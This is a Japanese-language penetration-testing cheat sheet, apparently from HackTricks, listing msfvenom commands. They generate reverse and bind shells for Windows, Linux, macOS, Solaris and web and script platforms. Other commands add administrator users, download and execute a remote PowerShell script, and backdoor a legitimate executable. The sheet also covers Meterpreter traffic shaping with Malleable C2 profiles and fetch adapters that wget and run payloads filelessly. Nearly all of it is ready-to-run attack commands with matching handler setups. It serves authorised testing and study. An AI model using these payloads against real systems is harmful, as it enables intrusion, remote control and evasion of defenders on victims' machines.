# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## msfvenom の基本

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

`-a` を使用して payload のアーキテクチャを選択し、`--platform` を使用して対象 platform を選択します。<sup>[[1]](#references)</sup>

## 一覧
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
これらのコマンドは、インストールされている framework で利用可能な payload および encoder モジュールを一覧表示します。<sup>[[1]](#references)</sup>

## shellcode を作成する際の共通パラメータ
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
ここで示すフラグは、bad characters、出力形式、encoder、encoding の反復回数を指定します。<sup>[[1]](#references)</sup>

## HTTP(S) Meterpreter トラフィックシェーピング

Metasploit 6.5では、staged および stageless の reverse HTTP(S) Meterpreter payload に `MALLEABLEC2` オプションが追加されました。profile によって、URI、user agent、request/response headers、connection-ID の配置、サポートされる body encoding/wrapper を変更できます。生成された payload とその handler の両方で、**同じローカル profile** を読み込む必要があります。staged payload の Meterpreter stage に対する初回リクエストはシェーピングされないため、初回リクエストも profile に一致させる必要がある場合は、`windows/x64/meterpreter_reverse_https` などの stageless payload を優先してください。<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
一致するhandlerを、同一のpayloadとprofileで設定します。<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
実装済みとして文書化されている directive のみが traffic に影響します。サポートされていない profile block は正常に parse される場合がありますが、効果はありません。<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### ユーザーの作成
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **コマンドを実行**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding is not AV evasion:** `x86/shikata_ga_nai` などの encoder は、主に bad-character の制約を満たすために使用されます。encoding の繰り返しは、信頼性の高い AV-evasion technique ではありません。<sup>[[1]](#references)</sup>

### executable 内に埋め込む
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **WebベースのPayload**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **スクリプト言語のpayloads**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads は、利用可能な target utility に基盤となる native payload を download および execute させる command を生成します。名前は `cmd/<platform>/<fetch-protocol>/<served-payload>` の形式に従います。HTTP(S)、SMB、TFTP の adapters が利用可能で、downloader の選択肢は target platform によって異なります。<sup>[[2]](#references)</sup>

たとえば、port 8080 から x64 Meterpreter payload を取得し、port 4444 で接続を戻す Linux `wget` command を生成します。<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
同じ設定で **fetch handler** を起動します。生成された ELF をホストし、提供された Meterpreter payload 用の handler も起動します：<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
有用な依存オプションには、対応している場合により短い HTTP(S) コマンドを出力する `FETCH_PIPE=true` や、匿名ファイルディスクリプタから Linux ELF を実行するための `FETCH_FILELESS=shell`、`shell-search`、`python3.8+` があります。Fileless モードには Linux kernel 3.17 以降が必要です。サポートされる組み合わせは異なるため、`msfvenom -p <FETCH_PAYLOAD> --list-options` で正確な adapter を確認してください。<sup>[[2]](#references)</sup>



## References

- [1] [msfvenom の使い方](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Fetch Payloads の使い方](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
